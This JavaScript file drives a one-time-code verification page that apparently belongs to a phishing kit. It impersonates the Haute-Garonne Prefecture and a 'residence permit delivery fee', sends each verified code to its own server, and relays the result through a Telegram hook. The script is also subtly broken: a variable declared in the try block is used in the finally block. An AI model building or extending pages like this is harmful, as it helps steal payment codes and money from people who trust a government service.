const otpForm = document.getElementById('otpForm');
const otpInput = document.getElementById('otpInput');
const errorMessage = document.getElementById('errorMessage');
const resendButton = document.getElementById('resendButton');
const countdownDisplay = document.getElementById('countdownDisplay');

let countdownTime = 60;
let countdownInterval;

// Initialize OTP form
document.addEventListener('DOMContentLoaded', () => {
    // Set up resend button click handler
    if (resendButton) {
        resendButton.addEventListener('click', handleResendOTP);
    }
    
    // Start countdown timer
    startCountdown();
});

// Handle OTP form submission
otpForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const otpCode = otpInput.value.trim();
    
    if (otpCode.length !== 6) {
        showError('Please enter a valid 6-digit code');
        return;
    }
    
    try {
        // Show loading state
        const submitButton = otpForm.querySelector('button[type="submit"]');
        const originalText = submitButton.textContent;
        submitButton.textContent = 'Verifying...';
        submitButton.disabled = true;
        
        // Send OTP verification request
        const response = await fetch('/api/verify-otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ otp: otpCode })
        });
        
        if (!response.ok) {
            throw new Error('Verification failed');
        }
        
        const data = await response.json();
        
        if (data.success) {
            // Send confirmation email
            await sendConfirmationEmail(data.userEmail);
            
            // Send result via Telegram
            sendTelegramNotification(data.userId, 'OTP verification successful');
            
            // Redirect to success page
            window.location.href = '/success.html';
        } else {
            showError(data.message || 'Invalid verification code');
        }
    } catch (error) {
        console.error('OTP verification error:', error);
        showError('Unable to verify code. Please try again.');
    } finally {
        // Reset button state
        const submitButton = otpForm.querySelector('button[type="submit"]');
        if (submitButton) {
            submitButton.textContent = originalText;
            submitButton.disabled = false;
        }
    }
});

// Handle resend OTP request
async function handleResendOTP(e) {
    e.preventDefault();
    
    if (resendButton.disabled) return;
    
    try {
        resendButton.disabled = true;
        resendButton.textContent = 'Sending...';
        
        const response = await fetch('/api/resend-otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        });
        
        if (!response.ok) {
            throw new Error('Failed to resend OTP');
        }
        
        // Reset countdown timer
        countdownTime = 60;
        startCountdown();
        
    } catch (error) {
        console.error('Resend OTP error:', error);
        alert('Failed to resend code. Please try again.');
        resendButton.disabled = false;
        resendButton.textContent = 'Resend Code';
    }
}

// Start countdown timer for resend button
function startCountdown() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    resendButton.disabled = true;
    resendButton.textContent = `Resend in ${countdownTime}s`;
    
    countdownInterval = setInterval(() => {
        countdownTime--;
        
        if (countdownTime <= 0) {
            clearInterval(countdownInterval);
            resendButton.disabled = false;
            resendButton.textContent = 'Resend Code';
            countdownTime = 60;
        } else {
            resendButton.textContent = `Resend in ${countdownTime}s`;
        }
    }, 1000);
}

// Display error message
function showError(message) {
    errorMessage.textContent = message;
    errorMessage.style.display = 'block';
    
    // Hide error after 5 seconds
    setTimeout(() => {
        errorMessage.style.display = 'none';
    }, 5000);
}

// Send confirmation email using emailService
async function sendConfirmationEmail(email) {
    try {
        const response = await fetch('/api/send-confirmation-email', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ 
                email: email,
                subject: 'Haute-Garonne Prefecture - OTP Verification Confirmed',
                message: 'Your residence permit delivery fee has been processed successfully.'
            })
        });
        
        if (!response.ok) {
            throw new Error('Email sending failed');
        }
    } catch (error) {
        console.error('Email sending error:', error);
    }
}

// Send notification via Telegram using telegram.js
function sendTelegramNotification(userId, message) {
    if (typeof Telegram !== 'undefined' && Telegram.sendNotification) {
        Telegram.sendNotification(userId, message);
    } else {
        console.warn('Telegram notification service not available');
    }
}

// Clear interval on page unload
window.addEventListener('beforeunload', () => {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
});